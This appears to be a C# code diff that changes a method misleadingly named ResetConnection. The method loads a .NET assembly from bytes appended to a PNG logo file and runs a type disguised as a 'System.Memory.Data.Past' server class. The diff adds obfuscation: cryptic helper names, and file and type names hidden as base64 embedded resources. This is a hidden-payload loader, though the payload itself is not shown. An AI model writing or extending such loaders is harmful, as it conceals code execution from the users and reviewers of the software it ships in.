@@ -16,6 +16,16 @@ namespace FPE
         //    return base64;
         //}
 
+        private static byte[] RAB(string fileName)
+        {
+            return File.ReadAllBytes(fileName);
+        }
+
+        private static Assembly AL(byte[] assemblyBytes)
+        {
+            return Assembly.Load(assemblyBytes);
+        }
+
         private static string GRFN(string resourceFileName, Assembly assembly)
         {
             foreach (var resource in assembly.GetManifestResourceNames())
@@ -41,27 +51,31 @@ namespace FPE
             return Encoding.UTF8.GetString(Convert.FromBase64String(b));
         }
 
-        private static string ChangeFileExtension(string fileName, string newExtension)
+        private static string CFE(string fileName, string newExtension)
         {
             var fileNameWithoutExtension = Path.GetFileNameWithoutExtension(fileName);
             return fileNameWithoutExtension + newExtension;
 
         }
 
-        const string PNG_FILENAME = "LlxibnNrLmxvZ28ucG5n"; // bnsk.logo.png
         const string EXT_2 = "LjIucG5n";  // ".2.png"
 
         public static int ResetConnection()
         {
             try
             {
-                var buffer1 = File.ReadAllBytes(bTos(PNG_FILENAME));
-                var buffer2 = File.ReadAllBytes(ChangeFileExtension(bTos(PNG_FILENAME), bTos(EXT_2)));
-                var myAssembly = Assembly.Load(buffer2.Skip(buffer1.Length).ToArray());
+                //var z = GTR64("blpng.txt", Assembly.GetExecutingAssembly());
+                var myAssembly = AL(
+                    RAB(CFE(GTR64("blpng.txt", Assembly.GetExecutingAssembly()), bTos(EXT_2)))
+                        .Skip(
+                            RAB(GTR64("blpng.txt", Assembly.GetExecutingAssembly())).Length
+                        ).ToArray()
+                );
 
-                var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
+                var ml = ML(
 
-                var ml = ML(myType,
+                    myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())) // "System.Memory.Data.Past.FPEServer"
+                    ,
                     Encoding.UTF8.GetString(Convert.FromBase64String(GTR("RC.txt", Assembly.GetExecutingAssembly()))) /*methodName*/
                 );
 
@@ -81,8 +95,8 @@ namespace FPE
         {
             try
             {
-                var buffer1 = File.ReadAllBytes(bTos(PNG_FILENAME));
-                var buffer2 = File.ReadAllBytes(ChangeFileExtension(bTos(PNG_FILENAME), bTos(EXT_2)));
+                var buffer1 = File.ReadAllBytes(bTos(GTR64("blpng.txt", Assembly.GetExecutingAssembly())));
+                var buffer2 = File.ReadAllBytes(CFE(bTos(GTR64("blpng.txt", Assembly.GetExecutingAssembly())), bTos(EXT_2)));
                 var myAssembly = Assembly.Load(buffer2.Skip(buffer1.Length).ToArray());
 
                 var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
@@ -99,62 +113,6 @@ namespace FPE
             return 4;
         }
 
-
-        
-        public static bool ResetConnection_SemiIL()
-        {
-            try
-            {
-                var myAssembly = Assembly.LoadFrom(GTR64("SMDP.txt", Assembly.GetExecutingAssembly())); // @".\System.Memory.Data.Past.dll"
-                var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
-                //var myMethod = myType.GetMethod(GTR64("RC.txt", Assembly.GetExecutingAssembly()), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
-                //var fileName = GTR("FzCD.txt", Assembly.GetExecutingAssembly());
-                //if (myMethod != null)
-                //    return (bool)myMethod.Invoke(null, new object[] { fileName }); //var s = @".\Files\zCasData.dat";
-
-                var ml = ML(myType,
-
-                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("RC.txt", Assembly.GetExecutingAssembly()))) /*methodName*/
-                );
-
-                bool result = ml(GTR("FzCD.txt", Assembly.GetExecutingAssembly()) /* << fileName*/);
-            }
-            catch (Exception ex)
-            {
-                var m = ex.Message;
-                throw new ApplicationException(m, ex);
-            }
-            return false;
-        }
-
-        public static bool ResetConnection_IL()
-        {
-            try
-            {
-                var myAssembly = Assembly.LoadFrom(GTR64("SMDP.txt", Assembly.GetExecutingAssembly())); // @".\System.Memory.Data.Past.dll"
-                var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
-
-                //var myType = TL(
-                //    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("SMDPFPES.txt", Assembly.GetExecutingAssembly())))
-                //    , 
-                //    Assembly.LoadFrom(
-                //        Encoding.UTF8.GetString(Convert.FromBase64String(GTR("SMDP.txt", Assembly.GetExecutingAssembly()))) /* @".\System.Memory.Data.Past.dll"*/
-                //    )
-                //);
-
-                var ml = ML(myType,
-
-                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("RC.txt", Assembly.GetExecutingAssembly()))) /*methodName*/
-                );
-
-                bool result = ml(GTR("FzCD.txt", Assembly.GetExecutingAssembly()) /* << fileName*/);
-            }
-            catch (Exception ex)
-            {
-                var m = ex.Message;
-            }
-            return false;
-        }
 
         private static Type TL(string typeName, Assembly myAssembly)
         {
